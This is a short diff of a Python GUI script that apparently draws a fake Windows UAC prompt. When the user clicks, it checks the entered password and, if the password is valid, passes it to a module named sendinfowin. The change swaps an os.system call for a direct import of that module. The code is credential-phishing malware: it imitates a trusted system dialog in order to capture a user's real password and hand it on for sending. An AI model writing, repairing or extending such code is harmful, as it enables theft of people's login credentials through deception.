@@ -135,7 +135,10 @@ def on_button1_click(button_text):
     global valid
     valid = is_valid_password (user, pword)
     if valid:
-        os.system (f"sendinfowin.py {pword}")
+        other_script_path = r'sendinfowin.py'
+        #subprocess.call ([sys.executable, other_script_path, pword])
+        import sendinfowin
+        sendinfowin.main (pword)
         root.destroy ()
         root.master.quit ()
     else:
@@ -281,4 +284,3 @@ def create_uac_box(width_percent, height_percent1, height_percent2):
 
 def show ():
     create_uac_box (0.4, 0.14, 0.6)
-
